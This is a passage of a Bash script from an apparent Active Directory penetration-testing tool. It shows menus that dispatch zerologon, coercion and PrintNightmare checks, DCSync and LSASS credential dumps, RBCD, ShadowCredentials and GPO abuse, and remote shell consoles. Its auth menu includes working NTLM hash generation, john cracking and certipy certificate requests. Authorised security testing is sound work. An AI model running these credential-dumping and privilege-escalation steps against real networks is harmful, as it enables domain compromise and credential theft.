        exit 1
        ;;

    *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        shares_menu
        ;;
    esac

}

vulns_menu() {
    mkdir -p "${Vulnerabilities_dir}"
    echo -e ""
    echo -e "${CYAN}[Vuln Checks menu]${NC} Please choose from the following options:"
    echo -e "------------------------------------------------------------"
    echo -e "${YELLOW}[i]${NC} Current target(s): ${YELLOW} ${curr_targets}${custom_servers}${custom_ip}${NC} - Number of server(s): ${YELLOW}$(wc -l < "${curr_targets_list}")${NC}"
    echo -e "A) VULNERABILITY CHECKS #3-4-5-8-13-16"
    echo -e "m) Modify target(s)"
    echo -e "1) zerologon check using netexec (only on DC)"
    echo -e "2) MS17-010 check using netexec"
    echo -e "3) Print Spooler and Printnightmare checks using netexec"
    echo -e "4) WebDAV check using netexec"
    echo -e "5) coerce check using netexec"
    echo -e "6) Run coerce attack using netexec"
    echo -e "7) SMB signing check using netexec"
    echo -e "8) ntlmv1, smbghost and remove-mic checks using netexec"
    echo -e "9) RPC Dump and check for interesting protocols"
    echo -e "10) Coercer RPC scan"
    echo -e "11) PushSubscription abuse using PrivExchange"
    echo -e "12) RunFinger scan"
    echo -e "13) Run LDAPNightmare check"
    echo -e "14) Run sessions enumeration using netexec (reg-sessions)"
    echo -e "15) Check for unusual sessions"
    echo -e "16) Check for BadSuccessor vuln using netexec and impacket"
    echo -e "back) Go back"
    echo -e "exit) Exit"

    read -rp "> " option_selected </dev/tty

    case ${option_selected} in
    A)
        vuln_checks
        vulns_menu
        ;;

    m)
        modify_target
        vulns_menu
        ;;

    1)
        zerologon_check
        vulns_menu
        ;;

    2)
        ms17-010_check
        vulns_menu
        ;;

    3)
        print_check
        vulns_menu
        ;;

    4)
        webdav_check
        vulns_menu
        ;;

    5)
        coerceplus_check
        vulns_menu
        ;;

    6)
        coerce_netexec
        vulns_menu
        ;;

    7)
        smbsigning_check
        vulns_menu
        ;;

    8)
        smb_checks
        vulns_menu
        ;;

    9)
        rpcdump_check
        vulns_menu
        ;;

    10)
        coercer_check
        vulns_menu
        ;;

    11)
        privexchange_check
        vulns_menu
        ;;

    12)
        runfinger_check
        vulns_menu
        ;;

    13)
        ldapnightmare_check
        vulns_menu
        ;;

    14)
        regsessions_check
        vulns_menu
        ;;

    15)
        findunusess_check
        vulns_menu
        ;;

    16)
        badsuccessor_check
        vulns_menu
        ;;

    back)
        main_menu
        ;;

    exit)
        exit 1
        ;;

    *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        vulns_menu
        ;;
    esac
}

mssql_menu() {
    mkdir -p "${MSSQL_dir}"
    echo -e ""
    echo -e "${CYAN}[MSSQL Enumeration menu]${NC} Please choose from the following options:"
    echo -e "------------------------------------------------------------------"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] MSSQL Enumeration requires credentials${NC}"
    else
        echo -e "A) MSSQL CHECKS #1-2"
        echo -e "1) MSSQL Enumeration using netexec"
        echo -e "2) MSSQL Relay check"
        echo -e "3) Open mssqlclient.py console on target"
        echo -e "4) Open mssqlpwner in interactive mode"
        echo -e "5) Enumeration Domain objects using RID bruteforce"
    fi
    echo -e "back) Go back"
    echo -e "exit) Exit"

    read -rp "> " option_selected </dev/tty

    case ${option_selected} in
    A)
        mssql_checks
        mssql_menu
        ;;

    1)
        mssql_enum
        mssql_menu
        ;;

    2)
        mssql_relay_check
        mssql_menu
        ;;

    3)
        mssqlclient_console
        mssql_menu
        ;;

    4)
        mssqlpwner_console
        mssql_menu
        ;;

    5)
        mssql_enum_domain_users
        mssql_menu
        ;;

    back)
        main_menu
        ;;

    exit)
        exit 1
        ;;

    *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        mssql_menu
        ;;
    esac
}

pwd_menu() {
    mkdir -p "${Credentials_dir}"
    echo -e ""
    echo -e "${CYAN}[Password Dump menu]${NC} Please choose from the following options:"
    echo -e "--------------------------------------------------------------"
    echo -e "${YELLOW}[i]${NC} Current target(s): ${YELLOW} ${curr_targets}${custom_servers}${custom_ip}${NC} - Number of server(s): ${YELLOW}$(wc -l < "${curr_targets_list}")${NC}"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] Password Dump requires credentials${NC}"
    else
        echo -e "A) PASSWORD DUMPS #1-2-4-15-17"
        echo -e "m) Modify target(s)"
        echo -e "1) LAPS Dump using netexec"
        echo -e "2) gMSA Dump using netexec"
        echo -e "3) DCSync using secretsdump (only on DC)"
        echo -e "4) Dump SAM and LSA using secretsdump"
        echo -e "5) Dump SAM and SYSTEM using reg"
        echo -e "6) Dump NTDS using netexec"
        echo -e "7) Dump SAM and LSA secrets using netexec"
        echo -e "8) Dump SAM and LSA secrets using netexec without touching disk (regdump)"
        echo -e "9) Dump LSASS using lsassy"
        echo -e "10) Dump LSASS using handlekatz"
        echo -e "11) Dump LSASS using procdump"
        echo -e "12) Dump LSASS using nanodump"
        echo -e "13) Dump dpapi secrets using netexec"
        echo -e "14) Dump secrets using DonPAPI"
        echo -e "15) Dump secrets using DonPAPI (Disable Remote Ops operations)"
        echo -e "16) Dump secrets using hekatomb (only on DC)"
        echo -e "17) Search for juicy information using netexec"
        echo -e "18) Dump Veeam credentials (only from Veeam server)"
        echo -e "19) Dump Msol password (only from Azure AD-Connect server)"
        echo -e "20) Extract Bitlocker Keys"
        echo -e "21) Dump SAM and LSA secrets using winrm with netexec"
    fi
    echo -e "back) Go back"
    echo -e "exit) Exit"

    read -rp "> " option_selected </dev/tty

    case ${option_selected} in
    A)
        pwd_dump
        pwd_menu
        ;;

    m)
        modify_target
        pwd_menu
        ;;

    1)
        laps_dump
        pwd_menu
        ;;

    2)
        gmsa_dump
        pwd_menu
        ;;

    3)
        secrets_dump_dcsync
        pwd_menu
        ;;

    4)
        secrets_dump
        pwd_menu
        ;;

    5)
        samsystem_dump
        pwd_menu
        ;;

    6)
        ntds_dump
        pwd_menu
        ;;

    7)
        samlsa_dump
        pwd_menu
        ;;

    8)
        samlsa_reg_dump
        pwd_menu
        ;;

    9)
        lsassy_dump
        pwd_menu
        ;;

    10)
        handlekatz_dump
        pwd_menu
        ;;

    11)
        procdump_dump
        pwd_menu
        ;;

    12)
        nanodump_dump
        pwd_menu
        ;;

    13)
        dpapi_dump
        pwd_menu
        ;;

    14)
        donpapi_dump
        pwd_menu
        ;;

    15)
        donpapi_noreg_dump
        pwd_menu
        ;;

    16)
        hekatomb_dump
        pwd_menu
        ;;

    17)
        juicycreds_dump
        pwd_menu
        ;;

    18)
        veeam_dump
        pwd_menu
        ;;

    19)
        msol_dump
        pwd_menu
        ;;

    20)
        bitlocker_dump
        pwd_menu
        ;;

    21)
        winrm_dump
        pwd_menu
        ;;

    back)
        main_menu
        ;;

    exit)
        exit 1
        ;;

    *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        pwd_menu
        ;;
    esac
}

modif_menu() {
    mkdir -p "${Modification_dir}"
    echo -e ""
    echo -e "${CYAN}[Modification menu]${NC} Please choose from the following options:"
    echo -e "-------------------------------------------------------------"
    echo -e "${YELLOW}[i]${NC} Current target(s): ${YELLOW} ${curr_targets}${custom_servers}${custom_ip}${NC} - Number of server(s): ${YELLOW}$(wc -l < "${curr_targets_list}")${NC}"
    echo -e "m) Modify target(s)"
    echo -e "1) Change user or computer password (Requires: ${PURPLE}ForceChangePassword${NC})"
    echo -e "2) Add user to group (Requires: ${PURPLE}AddMember${NC} on group)"
    echo -e "3) Remove user from group (Requires: ${PURPLE}AddMember${NC} on group)"
    echo -e "4) Add new computer (Requires: MAQ > 0)"
    echo -e "4ou) Add new computer to a custom OU location (Requires: MAQ > 0 and ${PURPLE}GenericWrite${NC} on OU)"
    echo -e "5) Add new DNS entry (Requires: Modification of DNS)"
    echo -e "6) Enable account (Requires: ${PURPLE}GenericWrite${NC})"
    echo -e "7) Disable account (Requires: ${PURPLE}GenericWrite${NC})"
    echo -e "8) Change Owner of target (Requires: ${PURPLE}WriteOwner${NC} permission)"
    echo -e "9) Add GenericAll rights on target (Requires: ${PURPLE}Owner${NC} of object)"
    echo -e "10) Delete user or computer (Requires: ${PURPLE}GenericWrite${NC})"
    echo -e "11) Restore deleted user or computer (Requires: ${PURPLE}GenericWrite${NC} on OU of deleted object)"
    echo -e "12) Targeted Kerberoast Attack (Noisy!) (Requires: ${PURPLE}WriteSPN${NC})"
    echo -e "13) Perform RBCD attack (Requires: ${PURPLE}AllowedToAct${NC} on computer)"
    echo -e "14) Perform RBCD attack on SPN-less user (Requires: ${PURPLE}AllowedToAct${NC} on computer & MAQ=0)"
    echo -e "15) Perform ShadowCredentials attack (Requires: ${PURPLE}AddKeyCredentialLink${NC})"
    echo -e "16) Remove added ShadowCredentials (Requires: ${PURPLE}AddKeyCredentialLink${NC})"
    echo -e "17) Abuse GPO to execute command (Requires: ${PURPLE}GenericWrite${NC} on GPO)"
    echo -e "18) Add Unconstrained Delegation rights - uac: TRUSTED_FOR_DELEGATION (Requires: ${PURPLE}SeEnableDelegationPrivilege${NC} rights)"
    echo -e "19) Add CIFS and HTTP SPNs entries to computer with Unconstrained Deleg rights - ServicePrincipalName & msDS-AdditionalDnsHostName (Requires: ${PURPLE}Owner${NC} of computer)"
    echo -e "20) Add userPrincipalName to perform Kerberos impersonation of another user (Targeting Linux machines) (Requires: ${PURPLE}GenericWrite${NC} on user)"
    echo -e "21) Modify userPrincipalName to perform Certificate impersonation (ESC10) (Requires: ${PURPLE}GenericWrite${NC} on user)"
    echo -e "22) Add Constrained Delegation rights - uac: TRUSTED_TO_AUTH_FOR_DELEGATION (Requires: ${PURPLE}SeEnableDelegationPrivilege${NC} rights)"
    echo -e "23) Add HOST and LDAP SPN entries of DC to computer with Constrained Deleg rights - msDS-AllowedToDelegateTo (Requires: ${PURPLE}Owner${NC} of computer)"
    echo -e "24) Add dMSA to exploit BadSuccessor on Windows Server 2025 (Requires: ${PURPLE}GenericWrite${NC} on OU)"
    echo -e "25) Remove dMSA to clean after exploiting BadSuccessor (Requires: ${PURPLE}GenericWrite${NC} on OU)"
    echo -e "back) Go back"
    echo -e "exit) Exit"

    read -rp "> " option_selected </dev/tty

    case ${option_selected} in
    1)
        change_pass
        modif_menu
        ;;

    2)
        add_group_member
        modif_menu
        ;;

    3)
        remove_group_member
        modif_menu
        ;;

    4)
        add_computer
        modif_menu
        ;;

    4ou)
        add_computer_ou
        modif_menu
        ;;


    5)
        dnsentry_add
        modif_menu
        ;;

    6)
        enable_account
        modif_menu
        ;;

    7)
        disable_account
        modif_menu
        ;;

    8)
        change_owner
        modif_menu
        ;;

    9)
        add_genericall
        modif_menu
        ;;

    10)
        delete_object
        modif_menu
        ;;

    11) restore_account
        modif_menu
        ;;

    12)
        targetedkerberoast_attack
        modif_menu
        ;;

    13)
        rbcd_attack
        modif_menu
        ;;

    14)
        rbcd_spnless_attack
        modif_menu
        ;;

    15)
        shadowcreds_attack
        modif_menu
        ;;

    16)
        shadowcreds_delete
        modif_menu
        ;;

    17)
        pygpo_abuse
        modif_menu
        ;;

    18)
        add_unconstrained
        modif_menu
        ;;

    19)
        add_spn
        modif_menu
        ;;

    20)
        add_upn
        modif_menu
        ;;

    21)
        add_upn_esc10
        modif_menu
        ;;

    22)
        add_constrained
        modif_menu
        ;;

    23)
        add_spn_constrained
        modif_menu
        ;;

    24)
        badsuccessor_adddmsa
        modif_menu
        ;;

    25)
        badsuccessor_deletedmsa
        modif_menu
        ;;

    back)
        main_menu
        ;;

    exit)
        exit 1
        ;;

    *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        modif_menu
        ;;
    esac
}

cmdexec_menu() {
    mkdir -p "${CommandExec_dir}"
    echo -e ""
    echo -e "${CYAN}[Command Execution menu]${NC} Please choose from the following options:"
    echo -e "------------------------------------------------------------------"
    echo -e "1) Open CMD console using smbexec on target"
    echo -e "2) Open CMD console using wmiexec on target"
    echo -e "3) Open CMD console using psexec on target"
    echo -e "4) Open PowerShell console using evil-winrm on target"
    echo -e "back) Go back"
    echo -e "exit) Exit"

    read -rp "> " option_selected </dev/tty

    case ${option_selected} in
    1)
        smbexec_console
        cmdexec_menu
        ;;

    2)
        wmiexec_console
        cmdexec_menu
        ;;

    3)
        psexec_console
        cmdexec_menu
        ;;

    4)
        evilwinrm_console
        cmdexec_menu
        ;;

    back)
        main_menu
        ;;

    exit)
        exit 1
        ;;

    *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        cmdexec_menu
        ;;
    esac
}

netscan_menu() {
    mkdir -p "${Scans_dir}"
    echo -e ""
    echo -e "${CYAN}[Network Scan menu]${NC} Please choose from the following options:"
    echo -e "-------------------------------------------------------------"
    echo -e "${YELLOW}[i]${NC} Current target(s): ${YELLOW} ${curr_targets}${custom_servers}${custom_ip}${NC} - Number of server(s): ${YELLOW}$(wc -l < "${curr_targets_list}")${NC}"
    echo -e "A) NETWORK SCANS #1-3-4-7-8"
    echo -e "m) Modify target(s)"
    echo -e "1) Identify hosts with accessible SMB port using netexec"
    echo -e "2) Identify hosts with accessible RDP port using netexec"
    echo -e "3) Identify hosts with accessible WinRM port using netexec"
    echo -e "4) Identify hosts with accessible SSH port using netexec"
    echo -e "5) Identify hosts with accessible FTP port using netexec"
    echo -e "6) Identify hosts with accessible VNC port using netexec"
    echo -e "7) Identify hosts with accessible MSSQL port using netexec"
    echo -e "8) Basic scan of domain machines using NetworkHound"
    echo -e "9) Full scan of domain and Shadow IT machines using NetworkHound"
    echo -e "back) Go back"
    echo -e "exit) Exit"

    read -rp "> " option_selected </dev/tty

    case ${option_selected} in

    m)
        modify_target
        netscan_menu
        ;;

    A)
        netscan_run
        netscan_menu
        ;;

    1)
        ne_scan "smb"
        netscan_menu
        ;;

    2)
        ne_scan "rdp"
        netscan_menu
        ;;

    3)
        ne_scan "winrm"
        netscan_menu
        ;;

    4)
        ne_scan "ssh"
        netscan_menu
        ;;

    5)
        ne_scan "ftp"
        netscan_menu
        ;;

    6)
        ne_scan "vnc"
        netscan_menu
        ;;

    7)
        ne_scan "mssql"
        /bin/cat "${servers_list}" >> "${sql_ip_list}"
        netscan_menu
        ;;

    8)
        nhd_scan
        netscan_menu
        ;;

    9)
        nhd_shadowit
        netscan_menu
        ;;

    back)
        main_menu
        ;;

    exit)
        exit 1
        ;;

    *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        netscan_menu
        ;;
    esac
}

auth_menu() {
    echo -e ""
    echo -e "${YELLOW}[Auth menu]${NC} Please choose from the following options:"
    echo -e "-----------------------------------------------------"
    echo -e "1) Generate NTLM hash of current user - Pass the hash"
    echo -e "2) Crack NTLM hash of current user"
    echo -e "3) Generate AES Key using aesKrbKeyGen"
    echo -e "4) Generate TGT for current user (requires: password, NTLM hash or AES key) - Pass the key/Overpass the hash"
    echo -e "5) Request certificate (requires: authentication)"
    echo -e "6) Extract NTLM hash from Certificate using PKINIT (requires: pfx certificate)"
    echo -e "back) Go back to Main Menu"
    echo -e "exit) Exit"

    read -rp "> " option_selected </dev/tty

    case ${option_selected} in
    C)
        config_menu
        ;;

    A)
        auth_menu
        ;;

    1)
        echo -e "${BLUE}[*] Please specify password to convert to NTLM (default: current user):${NC}"
        read -rp ">> " pass_hash_gen </dev/tty
        if [[ ${pass_hash_gen} == "" ]]; then pass_hash_gen="${password}"; fi
        while [ "${pass_hash_gen}" == "" ]; do
            echo -e "${RED}Invalid password.${NC} Please specify password to convert:"
            read -rp ">> " pass_hash_gen </dev/tty
        done
        hash_gen="$(iconv -f ASCII -t UTF-16LE <(printf "%s" "$pass_hash_gen") | $(which openssl) dgst -md4 | cut -d " " -f 2)"
        echo -e "${GREEN}[+] NTLM hash generated:${NC} ${hash_gen}"
        echo -e "${GREEN}[+] Re-run linWinPwn to use hash instead:${NC} linWinPwn -t ${dc_ip} -d ${domain} -u '${user}' -H ${hash_gen}"
        auth_menu
        ;;

    2)
        if ! stat "${john}" >/dev/null 2>&1; then
            echo -e "${RED}[-] Please verify the installation of john${NC}"
        else
            echo -e "${BLUE}[*] Please specify NTLM hash to crack (default: current user):${NC}"
            read -rp ">> " hash_pass_gen </dev/tty
            if [[ ${hash_pass_gen} == "" ]]; then hash_pass_gen="${hash}"; fi
            while [ "${hash_pass_gen}" == "" ]; do
                echo -e "${RED}Invalid NTLM hash.${NC} Please specify NTLM hash to crack:"
                read -rp ">> " hash_pass_gen </dev/tty
            done
            echo "$hash_pass_gen" | cut -d ":" -f 2 >"${Credentials_dir}/ntlm_hash"
            echo -e "${CYAN}[*] Cracking NTLM hash using john the ripper${NC}"
            ${john} "${Credentials_dir}/ntlm_hash" --format=NT --wordlist="${pass_wordlist}" | tee "${Credentials_dir}/johnNTLM_output_${dc_domain}.txt"
            john_out=$(${john} "${Credentials_dir}/ntlm_hash" --format=NT --show)
            if [[ "${john_out}" == *"1 password"* ]]; then
                password_cracked=$(echo "$john_out" | head -n 1 | cut -d ":" -f 2 | cut -d " " -f 1)
                echo -e "${GREEN}[+] NTLM hash successfully cracked:${NC} $password_cracked"
                echo -e "${GREEN}[+] Re-run linWinPwn to use password instead:${NC} linWinPwn -t ${dc_ip} -d ${domain} -u '${user}' -p ${password_cracked}"
            else
                echo -e "${RED}[-] Failed to crack NTLM hash${NC}"
            fi
        fi
        auth_menu
        ;;

    3)
        if ! stat "${aesKrbKeyGen}" >/dev/null 2>&1; then
            echo -e "${RED}[-] Please verify the installation of aesKrbKeyGen.py${NC}"
        else
            echo -e "${BLUE}[*] Please specify password to convert to AES (default: current user):${NC}"
            read -rp ">> " aes_pass_gen </dev/tty
            if [[ ${aes_pass_gen} == "" ]]; then aes_pass_gen="${password}"; fi
            while [ "${aes_pass_gen}" == "" ]; do
                echo -e "${RED}Invalid password.${NC} Please specify password to convert:"
                read -rp ">> " aes_pass_gen </dev/tty
            done
            aes_gen=$("${python3}" "${aesKrbKeyGen}" -domain "${domain}" -u "${user}" -pass "${aes_pass_gen}")
            aes_key=$(echo -e "${aes_gen}" | grep "AES256" | cut -d " " -f 4)
            if [[ ! "${aes_key}" == "" ]]; then
                echo -e "${GREEN}[+] AES Keys generated:${NC}\n${aes_gen}"
                echo -e "${GREEN}[+] Re-run linWinPwn to use AES key instead:${NC} linWinPwn -t ${dc_ip} -d ${domain} -u '${user}' -A ${aes_key}"
            elif [ "${noexec_bool}" == "false" ]; then
                echo -e "${RED}[-] Error generating AES Keys${NC}"
            fi
        fi
        auth_menu
        ;;

    4)
        if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
            echo -e "${CYAN}[*] Requesting TGT for current user${NC}"
            krb_ticket="${Credentials_dir}/${user}"
            run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --generate-tgt ${krb_ticket} --log ${Credentials_dir}/getTGT_output_${user_var}.txt"
            if stat "${krb_ticket}.ccache" >/dev/null 2>&1; then
                echo -e "${GREEN}[+] TGT generated successfully:${NC} '$krb_ticket.ccache'"
                echo -e "${GREEN}[+] Re-run linWinPwn to use ticket instead:${NC} linWinPwn -t ${dc_ip} -d ${domain} -u '${user}' -K '${krb_ticket}.ccache'"
            elif [ "${noexec_bool}" == "false" ]; then
                echo -e "${RED}[-] Failed to generate TGT${NC}"
            fi
        else
            echo -e "${RED}[-] Error! Requires password, NTLM hash or AES key...${NC}"
        fi
        auth_menu
        ;;

    5)
        if ! stat "${certipy}" >/dev/null 2>&1; then
            echo -e "${RED}[-] Please verify the installation of certipy${NC}"
        else
            if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ] || [ "${aeskey_bool}" == true ] || [ "${kerb_bool}" == true ]; then
                ne_adcs_enum
                if [ ! "${pki_servers}" == "" ] && [ ! "${pki_cas}" == "" ]; then
                    current_dir=$(pwd)
                    cd "${Credentials_dir}" || exit
                    i=0
                    for pki_server in $pki_servers; do
                        i=$((i + 1))
                        pki_ca=$(echo -e "$pki_cas" | sed 's/ /\n/g' | sed -n ${i}p)
                        if [ "${ldaps_bool}" == true ]; then
                            ldaps_param=""
                            if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param=""; else ldapbindsign_param="-no-ldap-channel-binding"; fi
                        else
                            ldaps_param="-ldap-scheme ldap"
                            if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param=""; else ldapbindsign_param="-no-ldap-signing"; fi
                        fi
                        if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
                        run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} ${dnstcp_param} -target ${pki_server} -ca \"${pki_ca//SPACE/ }\" -template User -key-size 4096 ${ldaps_param} ${ldapbindsign_param}" | tee "${Credentials_dir}/certipy_reqcert_output_${user_var}.txt"
                    done
                    cd "${current_dir}" || exit
                else
                    echo -e "${PURPLE}[-] No ADCS servers found! Please re-run ADCS enumeration and try again..${NC}"
                fi
                if stat "${Credentials_dir}/${user}.pfx" >/dev/null 2>&1; then
                    pfxcert="${Credentials_dir}/${user}.pfx"
                    pfxpass=""
                    echo -e "${GREEN}[+] PFX Certificate requested successfully:${NC} '${Credentials_dir}/${user}.pfx'"
                    $(which openssl) pkcs12 -in "${Credentials_dir}/${user}.pfx" -out "${Credentials_dir}/${user}.pem" -nodes -passin pass:""
                    if stat "${Credentials_dir}/${user}.pem" >/dev/null 2>&1; then
                        pem_cert="${Credentials_dir}/${user}.pem"
                        echo -e "${GREEN}[+] PFX Certificate converted to PEM successfully:${NC} '${pem_cert}'"
                    fi
                    echo -e "${GREEN}[+] Re-run linWinPwn to use certificate instead:${NC} linWinPwn -t ${dc_ip} -d ${domain} -u '${user}' -C '${pfxcert}'"
                elif [ "${noexec_bool}" == "false" ]; then
                    echo -e "${RED}[-] Failed to request certificate${NC}"
                fi
            else
                echo -e "${RED}[-] Error! Requires password, NTLM hash, AES key or Kerberos ticket...${NC}"
            fi
        fi
        auth_menu
        ;;

    6)
        if ! stat "${certipy}" >/dev/null 2>&1; then
            echo -e "${RED}[-] Please verify the installation of certipy${NC}"
        else
            if [[ ${cert_bool} == false ]]; then
                echo -e "${BLUE}[*] Please specify location of certificate file:${NC}"
                read -rp ">> " pfxcert </dev/tty
                while [ ! -s "${pfxcert}" ]; do
                    echo -e "${RED}Invalid pfx file.${NC} Please specify location of certificate file:"
                    read -rp ">> " pfxcert </dev/tty
                done
                if [[ ${pfxpass} == "" ]]; then
                    echo -e "${BLUE}[*] Please specify password of certificate file (press Enter if no password):${NC}"
                    read -rp ">> " pfxpass </dev/tty
                fi
            fi
            echo -e "${CYAN}[*] Extracting NTLM hash from certificate using PKINIT${NC}"
            pkinit_auth
        fi
        echo -e ""
        auth_menu
        ;;

    back)
        main_menu
        ;;

    exit)
        exit 1
        ;;

    *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        auth_menu
        ;;
    esac
}

config_menu() {
    mkdir -p "${Config_dir}"
    echo -e ""
    echo -e "${YELLOW}[Config menu]${NC} Please choose from the following options:"
    echo -e "-------------------------------------------------------"
    echo -e "1) Check installation of tools and dependencies"
    echo -e "2) Synchronize time with Domain Controller (requires root)"
    echo -e "3) Add Domain Controller's IP and Domain to /etc/hosts (requires root)"
    echo -e "4) Update resolv.conf to define Domain Controller as DNS server (requires root)"
    echo -e "5) Update krb5.conf to define realm and KDC for Kerberos (requires root)"
    echo -e "6) Download default username and password wordlists (non-kali machines)"
    echo -e "7) Change users wordlist file"
    echo -e "8) Change passwords wordlist file"
    echo -e "9) Change attacker's IP"
    echo -e "10) Switch between LDAP (port 389) and LDAPS (port 636)"
    echo -e "11) Show session information"
    echo -e "back) Go back to Main Menu"
    echo -e "exit) Exit"

    read -rp "> " option_selected </dev/tty

    case ${option_selected} in
    1)
        echo -e ""
        if ! stat "${impacket_findDelegation}" >/dev/null 2>&1; then echo -e "${RED}[-] impacket's findDelegation is not installed${NC}"; else echo -e "${GREEN}[+] impacket's findDelegation is installed${NC}"; fi
        if ! stat "${impacket_GetUserSPNs}" >/dev/null 2>&1; then echo -e "${RED}[-] impacket's GetUserSPNs is not installed${NC}"; else echo -e "${GREEN}[+] impacket's GetUserSPNs is installed${NC}"; fi
        if ! stat "${impacket_secretsdump}" >/dev/null 2>&1; then echo -e "${RED}[-] impacket's secretsdump is not installed${NC}"; else echo -e "${GREEN}[+] impacket's secretsdump is installed${NC}"; fi
        if ! stat "${impacket_GetNPUsers}" >/dev/null 2>&1; then echo -e "${RED}[-] impacket's GetNPUsers is not installed${NC}"; else echo -e "${GREEN}[+] impacket's GetNPUsers is installed${NC}"; fi
        if ! stat "${impacket_getTGT}" >/dev/null 2>&1; then echo -e "${RED}[-] impacket's getTGT is not installed${NC}"; else echo -e "${GREEN}[+] impacket's getTGT is installed${NC}"; fi
        if ! stat "${impacket_goldenPac}" >/dev/null 2>&1; then echo -e "${RED}[-] impacket's goldenPac is not installed${NC}"; else echo -e "${GREEN}[+] impacket's goldenPac is installed${NC}"; fi
        if ! stat "${impacket_rpcdump}" >/dev/null 2>&1; then echo -e "${RED}[-] impacket's rpcdump is not installed${NC}"; else echo -e "${GREEN}[+] impacket's rpcdump is installed${NC}"; fi
        if ! stat "${impacket_reg}" >/dev/null 2>&1; then echo -e "${RED}[-] impacket's reg is not installed${NC}"; else echo -e "${GREEN}[+] impacket's reg is installed${NC}"; fi
        if ! stat "${impacket_ticketer}" >/dev/null 2>&1; then echo -e "${RED}[-] impacket's ticketer is not installed${NC}"; else echo -e "${GREEN}[+] impacket's ticketer is installed${NC}"; fi
        if ! stat "${impacket_getST}" >/dev/null 2>&1; then echo -e "${RED}[-] impacket's getST is not installed${NC}"; else echo -e "${GREEN}[+] impacket's getST is installed${NC}"; fi
        if ! stat "${impacket_raiseChild}" >/dev/null 2>&1; then echo -e "${RED}[-] impacket's raiseChild is not installed${NC}"; else echo -e "${GREEN}[+] impacket's raiseChild is installed${NC}"; fi
        if ! stat "${impacket_changepasswd}" >/dev/null 2>&1; then echo -e "${RED}[-] impacket's changepasswd is not installed${NC}"; else echo -e "${GREEN}[+] impacket's changepasswd is installed${NC}"; fi
        if ! stat "${impacket_describeticket}" >/dev/null 2>&1; then echo -e "${RED}[-] impacket's describeTicket is not installed${NC}"; else echo -e "${GREEN}[+] impacket's describeticket is installed${NC}"; fi
        if ! stat "${impacket_badsuccessor}" >/dev/null 2>&1; then echo -e "${RED}[-] impacket's badsuccessor is not installed${NC}"; else echo -e "${GREEN}[+] impacket's badsuccessor is installed${NC}"; fi
        if ! stat "${bloodhound}" >/dev/null 2>&1; then echo -e "${RED}[-] bloodhound is not installed${NC}"; else echo -e "${GREEN}[+] bloodhound is installed${NC}"; fi
        if ! stat "${ldapdomaindump}" >/dev/null 2>&1; then echo -e "${RED}[-] ldapdomaindump is not installed${NC}"; else echo -e "${GREEN}[+] ldapdomaindump is installed${NC}"; fi
        if ! stat "${netexec}" >/dev/null 2>&1; then echo -e "${RED}[-] netexec is not installed${NC}"; else echo -e "${GREEN}[+] netexec is installed${NC}"; fi
        if ! stat "${john}" >/dev/null 2>&1; then echo -e "${RED}[-] john is not installed${NC}"; else echo -e "${GREEN}[+] john is installed${NC}"; fi
        if ! stat "${smbmap}" >/dev/null 2>&1; then echo -e "${RED}[-] smbmap is not installed${NC}"; else echo -e "${GREEN}[+] smbmap is installed${NC}"; fi
        if ! stat "${nmap}" >/dev/null 2>&1; then echo -e "${RED}[-] nmap is not installed${NC}"; else echo -e "${GREEN}[+] nmap is installed${NC}"; fi
        if ! stat "${adidnsdump}" >/dev/null 2>&1; then echo -e "${RED}[-] adidnsdump is not installed${NC}"; else echo -e "${GREEN}[+] adidnsdump is installed${NC}"; fi
        if ! stat "${certi_py}" >/dev/null 2>&1; then echo -e "${RED}[-] certi_py is not installed${NC}"; else echo -e "${GREEN}[+] certi_py is installed${NC}"; fi
        if ! stat "${certipy}" >/dev/null 2>&1; then echo -e "${RED}[-] certipy is not installed${NC}"; else echo -e "${GREEN}[+] certipy is installed${NC}"; fi
        if ! stat "${ldeep}" >/dev/null 2>&1; then echo -e "${RED}[-] ldeep is not installed${NC}"; else echo -e "${GREEN}[+] ldeep is installed${NC}"; fi
        if ! stat "${pre2k}" >/dev/null 2>&1; then echo -e "${RED}[-] pre2k is not installed${NC}"; else echo -e "${GREEN}[+] pre2k is installed${NC}"; fi
        if ! stat "${certsync}" >/dev/null 2>&1; then echo -e "${RED}[-] certsync is not installed${NC}"; else echo -e "${GREEN}[+] certsync is installed${NC}"; fi
        if ! stat "${windapsearch}" >/dev/null 2>&1; then echo -e "${RED}[-] windapsearch is not installed${NC}"; else echo -e "${GREEN}[+] windapsearch is installed${NC}"; fi
        if ! stat "${enum4linux_py}" >/dev/null 2>&1; then echo -e "${RED}[-] enum4linux-ng is not installed${NC}"; else echo -e "${GREEN}[+] enum4linux-ng is installed${NC}"; fi
        if ! stat "${kerbrute}" >/dev/null 2>&1; then echo -e "${RED}[-] kerbrute is not installed${NC}"; else echo -e "${GREEN}[+] kerbrute is installed${NC}"; fi
        if ! stat "${targetedKerberoast}" >/dev/null 2>&1; then echo -e "${RED}[-] targetedKerberoast is not installed${NC}"; else echo -e "${GREEN}[+] targetedKerberoast is installed${NC}"; fi
        if ! stat "${CVE202233679}" >/dev/null 2>&1; then echo -e "${RED}[-] CVE-2022-33679 is not installed${NC}"; else echo -e "${GREEN}[+] CVE-2022-33679 is installed${NC}"; fi
        if ! stat "${silenthound}" >/dev/null 2>&1; then echo -e "${RED}[-] silenthound is not installed${NC}"; else echo -e "${GREEN}[+] silenthound is installed${NC}"; fi
